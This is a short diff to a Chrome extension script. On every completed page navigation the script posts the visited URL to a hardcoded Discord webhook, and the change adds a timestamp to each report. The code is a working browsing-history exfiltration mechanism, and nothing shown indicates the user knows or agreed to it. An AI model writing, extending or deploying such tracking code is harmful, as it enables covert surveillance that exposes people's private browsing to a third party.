@@ -3,8 +3,11 @@ const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/135193797971895913
 chrome.webNavigation.onCompleted.addListener(async (details) => {
   if (!details.url.startsWith("http")) return;
 
+  const now = new Date();
+  const timestamp = now.toLocaleString(); // Format: "7/6/2025, 8:13:14 PM"
+
   const payload = {
-    content: `🌐 Visited: ${details.url}`
+    content: `🌐 Visited: ${details.url}\n🕒 Time: ${timestamp}`
   };
 
   try {
